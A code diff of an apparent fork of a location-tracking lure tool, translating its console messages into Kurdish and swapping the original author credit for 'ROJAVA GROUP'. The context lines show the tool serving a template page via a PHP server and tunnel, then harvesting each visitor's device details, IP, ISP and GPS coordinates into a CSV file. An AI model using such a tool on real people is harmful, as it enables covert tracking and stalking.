@@ -8,7 +8,7 @@ W = '\033[0m'  # white
 
 from shutil import which
 
-print(G + '[+]' + C + ' Checking Dependencies...' + W)
+print(G + '[+]' + C + ' Kontrolkirina Girêdanên...' + W)
 pkgs = ['python3', 'pip3', 'php', 'ssh']
 inst = True
 for pkg in pkgs:
@@ -55,14 +55,14 @@ def banner():
                         __
   ______  ____   ____  |  | __  ____ _______
  /  ___/_/ __ \_/ __ \ |  |/ /_/ __ \\_  __ \
- \___ \ \  ___/\  ___/ |    < \  ___/ |  | \/
+Hûn bi xêr hatin amûra Rojava ya ji bo dîtina malperê bi rêya lînkê
 /____  > \___  >\___  >|__|_ \ \___  >|__|
 	 \/      \/     \/      \/     \/        ''' + W)
-	print('\n' + G + '[>]' + C + ' Created By : ' + W + 'thewhiteh4t')
+	print('\n' + G + '[>]' + C + ' Created By : ' + W + 'ROJAVA GROUP')
 	print(G + '[>]' + C + ' Version    : ' + W + version + '\n')
 
 def ver_check():
-	print(G + '[+]' + C + ' Checking for Updates.....', end='')
+	print(G + '[+]' + C + ' Ji bo Nûvekirinan kontrol dikin.....', end='')
 	ver_url = 'https://raw.githubusercontent.com/thewhiteh4t/seeker/master/version.txt'
 	try:
 		ver_rqst = requests.get(ver_url)
@@ -72,9 +72,9 @@ def ver_check():
 			github_ver = github_ver.strip()
 
 			if version == github_ver:
-				print(C + '[' + G + ' Up-To-Date ' + C +']' + '\n')
+				print(C + '[' + G + ' Biroj ' + C +']' + '\n')
 			else:
-				print(C + '[' + G + ' Available : {} '.format(github_ver) + C + ']' + '\n')
+				print(C + '[' + G + ' Berdeste : {} '.format(github_ver) + C + ']' + '\n')
 		else:
 			print(C + '[' + R + ' Status : {} '.format(ver_sc) + C + ']' + '\n')
 	except Exception as e:
@@ -84,14 +84,14 @@ def tunnel_select():
 	if tunnel_mode == None:
 		serveo()
 	elif tunnel_mode == 'manual':
-		print(G + '[+]' + C + ' Skipping Serveo, start your own tunnel service manually...' + W + '\n')
+		print(G + '[+]' + C + ' Serveo derbas bikin, karûbarê xweya tunelê bi destan dest pê bikin...' + W + '\n')
 	else:
 		print(R + '[+]' + C + ' Invalid Tunnel Mode Selected, Check Help [-h, --help]' + W + '\n')
 		exit()
 
 def template_select():
 	global site, info, result
-	print(G + '[+]' + C + ' Select a Template : ' + W + '\n')
+	print(G + '[+]' + C + ' Şablonek hilbijêre : ' + W + '\n')
 	
 	with open('template/templates.json', 'r') as templ:
 		templ_info = templ.read()
@@ -172,7 +172,7 @@ def serveo():
 
 def server():
 	print('\n' + G + '[+]' + C + ' Port : '+ W + str(port))
-	print('\n' + G + '[+]' + C + ' Starting PHP Server......' + W, end='')
+	print('\n' + G + '[+]' + C + ' Pêşkêşkara PHP-ê dest pê dike......' + W, end='')
 	with open('logs/php.log', 'w') as phplog:
 		subp.Popen(['php', '-S', '0.0.0.0:{}'.format(port), '-t', 'template/{}/'.format(site)], stdout=phplog, stderr=phplog)
 		time.sleep(3)
@@ -193,7 +193,7 @@ def wait():
 		time.sleep(2)
 		size = os.path.getsize(result)
 		if size == 0 and printed == False:
-			print('\n' + G + '[+]' + C + ' Waiting for User Interaction...' + W + '\n')
+			print('\n' + G + '[+]' + C + ' Li benda Têkiliya Bikarhêner...' + W + '\n')
 			printed = True
 		if size > 0:
 			main()
@@ -230,7 +230,7 @@ def main():
 				row.append(var_browser)
 				row.append(var_ip)
 
-				print(G + '[+]' + C + ' Device Information : ' + W + '\n')
+				print(G + '[+]' + C + ' Agahdariya cîhazê : ' + W + '\n')
 				print(G + '[+]' + C + ' OS         : ' + W + var_os)
 				print(G + '[+]' + C + ' Platform   : ' + W + var_platform)
 				print(G + '[+]' + C + ' CPU Cores  : ' + W + var_cores)
@@ -261,10 +261,10 @@ def main():
 					row.append(var_org)
 					row.append(var_isp)
 
-					print(G + '[+]' + C + ' Continent  : ' + W + var_continent)
-					print(G + '[+]' + C + ' Country    : ' + W + var_country)
-					print(G + '[+]' + C + ' Region     : ' + W + var_region)
-					print(G + '[+]' + C + ' City       : ' + W + var_city)
+					print(G + '[+]' + C + ' Qite  : ' + W + var_continent)
+					print(G + '[+]' + C + ' Welat    : ' + W + var_country)
+					print(G + '[+]' + C + ' Herêm     : ' + W + var_region)
+					print(G + '[+]' + C + ' Bajar       : ' + W + var_city)
 					print(G + '[+]' + C + ' Org        : ' + W + var_org)
 					print(G + '[+]' + C + ' ISP        : ' + W + var_isp)
 	except ValueError:
@@ -304,13 +304,13 @@ def main():
 				row.append(var_dir)
 				row.append(var_spd)
 
-				print ('\n' + G + '[+]' + C + ' Location Information : ' + W + '\n')
-				print (G + '[+]' + C + ' Latitude  : ' + W + var_lat)
-				print (G + '[+]' + C + ' Longitude : ' + W + var_lon)
-				print (G + '[+]' + C + ' Accuracy  : ' + W + var_acc)
-				print (G + '[+]' + C + ' Altitude  : ' + W + var_alt)
-				print (G + '[+]' + C + ' Direction : ' + W + var_dir)
-				print (G + '[+]' + C + ' Speed     : ' + W + var_spd)
+				print ('\n' + G + '[+]' + C + ' Agahiya Cihê : ' + W + '\n')
+				print (G + '[+]' + C + ' Firehî  : ' + W + var_lat)
+				print (G + '[+]' + C + ' Dirêjî : ' + W + var_lon)
+				print (G + '[+]' + C + ' Tamî  : ' + W + var_acc)
+				print (G + '[+]' + C + ' Bilindayî  : ' + W + var_alt)
+				print (G + '[+]' + C + ' Ber : ' + W + var_dir)
+				print (G + '[+]' + C + ' Zûbûnî     : ' + W + var_spd)
 	except ValueError:
 		error = file
 		print ('\n' + R + '[-] ' + W + error)
@@ -341,7 +341,7 @@ def csvout():
 	with open('db/results.csv', 'a') as csvfile:
 		writer = csv.writer(csvfile)
 		writer.writerow(row)
-	print(G + '[+]' + C + ' New Entry Added in Database.: ' + W + os.getcwd() + '/db/results.csv')
+	print(G + '[+]' + C + ' Têketina Nû Di Danegehê de Zêde bû.: ' + W + os.getcwd() + '/db/results.csv')
 
 def clear():
 	global result
